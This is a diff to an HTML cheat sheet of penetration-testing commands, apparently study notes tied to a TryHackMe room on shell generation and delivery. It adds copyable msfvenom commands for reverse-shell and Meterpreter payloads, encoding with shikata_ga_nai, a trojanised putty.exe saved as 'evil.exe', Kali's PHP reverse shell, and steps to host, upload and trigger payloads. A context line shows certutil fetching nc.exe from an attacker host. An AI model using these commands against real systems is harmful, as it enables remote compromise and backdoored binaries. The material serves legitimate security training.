@@ -653,7 +653,7 @@ certutil -urlcache -f http://LHOST/nc.exe nc.exe   <span class="cm"># windows</s
   <!-- METASPLOIT -->
   <section class="section" id="msf" style="--pc:var(--access)">
     <div class="shead"><span class="bar"></span><span class="num">06</span><h2>Metasploit &amp; msfvenom</h2><span class="chev">▼</span></div>
-    <div class="sbody"><p class="sublead">When a hand-built shell isn't enough: framework-driven exploitation, payload generation with msfvenom, and Meterpreter post-exploitation.</p><div class="grid">
+    <div class="sbody"><p class="sublead">When a hand-built shell isn't enough: framework-driven exploitation, <b>generating payloads with msfvenom</b>, <b>delivering</b> them to the target, and Meterpreter post-exploitation.</p><div class="grid">
       <div class="card"><h3>msfconsole <span class="tag">exploit</span></h3>
         <div class="cmd"><code>msfconsole -q
 search TYPE:exploit apache
@@ -671,6 +671,69 @@ run</code><button class="copy">⧉</button></div>
         <span class="lbl">php / war / aspx</span>
         <div class="cmd"><code>msfvenom -p php/reverse_php LHOST=tun0 LPORT=4444 -f raw -o s.php</code><button class="copy">⧉</button></div>
         <p class="note">Catch meterpreter with <code class="inl">multi/handler</code>. Meterpreter: <code class="inl">getuid</code>, <code class="inl">hashdump</code>, <code class="inl">getsystem</code>, <code class="inl">background</code>.</p>
+      </div>
+
+      <div class="card"><h3>msfvenom anatomy <span class="tag">generate</span></h3>
+        <p class="note">One tool to build a payload in any language/format. Payload name = <code class="inl">&lt;platform&gt;/&lt;arch&gt;/&lt;payload&gt;</code> e.g. <code class="inl">linux/x86/meterpreter/reverse_tcp</code>.</p>
+        <span class="lbl">the template</span>
+        <div class="cmd"><code>msfvenom <span class="fl">-p</span> PAYLOAD LHOST=tun0 LPORT=4444 <span class="fl">-f</span> FORMAT <span class="fl">-o</span> out.ext</code><button class="copy">⧉</button></div>
+        <span class="lbl">list what's available</span>
+        <div class="cmd"><code>msfvenom <span class="fl">-l</span> payloads | grep linux
+msfvenom <span class="fl">--list</span> formats
+msfvenom <span class="fl">--list</span> encoders</code><button class="copy">⧉</button></div>
+        <p class="note"><code class="inl">-a</code> arch · <code class="inl">--platform</code> OS · <code class="inl">-p -</code> reads a custom payload from stdin. Always set <code class="inl">LHOST</code> to your VPN iface (<code class="inl">tun0</code>), not a NATed address.</p>
+        <p class="note" style="color:var(--faint)">📖 From THM <a href="https://tryhackme.com/room/shellgenerationdelivery" target="_blank" rel="noopener">Shell Generation &amp; Delivery</a>.</p>
+      </div>
+
+      <div class="card"><h3>Staged vs Stageless <span class="tag">read the name</span></h3>
+        <p class="note">The separator before <code class="inl">reverse_tcp</code> tells you the type — and which listener will actually work.</p>
+        <span class="lbl">stageless — underscore, self-contained</span>
+        <div class="cmd"><code>windows/x64/shell_reverse_tcp      <span class="cm"># whole shell in one shot</span></code><button class="copy">⧉</button></div>
+        <span class="lbl">staged — slash, stager pulls the rest</span>
+        <div class="cmd"><code>windows/x64/shell/reverse_tcp
+windows/x64/meterpreter/reverse_tcp</code><button class="copy">⧉</button></div>
+        <p class="note"><b>Stageless</b> (<code class="inl">shell_reverse_tcp</code>) = bigger, more reliable on flaky links, and a plain <code class="inl">nc -lvnp</code> catches it. <b>Staged</b> (<code class="inl">shell/reverse_tcp</code>) = tiny first stage that downloads the payload from your handler → needs <code class="inl">multi/handler</code> with the <b>exact same</b> PAYLOAD; a bare <code class="inl">nc</code> catches the stager but the session never forms.</p>
+      </div>
+
+      <div class="card"><h3>Output formats <span class="tag">-f</span></h3>
+        <p class="note">Same payload, different wrapper — pick the format the target will actually run.</p>
+        <span class="lbl">executables</span>
+        <div class="cmd"><code>-f exe   -o s.exe       <span class="cm"># windows</span>
+-f elf   -o s.elf       <span class="cm"># linux  (chmod +x)</span>
+-f macho -o s.macho</code><button class="copy">⧉</button></div>
+        <span class="lbl">web / scripts</span>
+        <div class="cmd"><code>-f asp / aspx / jsp / war   <span class="cm"># app servers</span>
+-f raw -o s.php             <span class="cm"># php (prepend &lt;?php if absent)</span>
+-f psh -o s.ps1             <span class="cm"># powershell</span></code><button class="copy">⧉</button></div>
+        <span class="lbl">raw shellcode for exploit dev</span>
+        <div class="cmd"><code>-f c      <span class="cm"># C buffer</span>
+-f python <span class="cm"># py buf</span>
+-f hex</code><button class="copy">⧉</button></div>
+      </div>
+
+      <div class="card"><h3>Encoders &amp; bad chars <span class="tag">encode</span></h3>
+        <span class="lbl">encode N times</span>
+        <div class="cmd"><code>msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 \
+ <span class="fl">-e</span> x86/shikata_ga_nai <span class="fl">-i</span> 10 -f exe -o s.exe</code><button class="copy">⧉</button></div>
+        <span class="lbl">strip bad characters</span>
+        <div class="cmd"><code>msfvenom -p ... <span class="fl">-b</span> '\x00\x0a\x0d' -f c</code><button class="copy">⧉</button></div>
+        <span class="lbl">embed in a real exe (template)</span>
+        <div class="cmd"><code>msfvenom -p ... <span class="fl">-x</span> putty.exe <span class="fl">-k</span> -f exe -o evil.exe</code><button class="copy">⧉</button></div>
+        <p class="note">Encoding is <b>not</b> reliable AV evasion anymore (the stubs are signatured) — its real job is to <b>remove bad chars</b> (e.g. <code class="inl">\x00</code>) so shellcode survives an exploit. <code class="inl">-x</code>+<code class="inl">-k</code> binds the payload to a legit binary that still runs.</p>
+      </div>
+
+      <div class="card"><h3>Web shells &amp; delivery <span class="tag">deliver</span></h3>
+        <p class="note">Generating the payload is half the job — it still has to reach the target and <b>get executed</b>.</p>
+        <span class="lbl">ready-made shells shipped with kali</span>
+        <div class="cmd"><code>ls /usr/share/webshells/        <span class="cm"># php aspx jsp cfm perl</span>
+/usr/share/webshells/php/php-reverse-shell.php   <span class="cm"># edit $ip/$port</span></code><button class="copy">⧉</button></div>
+        <span class="lbl">generate a php web shell</span>
+        <div class="cmd"><code>msfvenom -p php/reverse_php LHOST=tun0 LPORT=4444 -f raw -o s.php</code><button class="copy">⧉</button></div>
+        <span class="lbl">host → deliver → trigger (listener first!)</span>
+        <div class="cmd"><code>python3 -m http.server 80            <span class="cm"># serve the payload</span>
+<span class="cm"># upload via file-upload / LFI / writable dir, or pull with wget/curl</span>
+<span class="cm"># then browse to it / run it to fire the shell back</span></code><button class="copy">⧉</button></div>
+        <p class="note">Match the catcher to the payload: stageless php/elf/exe → <code class="inl">nc -lvnp</code>; <code class="inl">meterpreter/*</code> or any <code class="inl">shell/…</code> staged payload → <code class="inl">multi/handler</code> with the same PAYLOAD/LPORT.</p>
       </div>
     </div></div>
   </section>
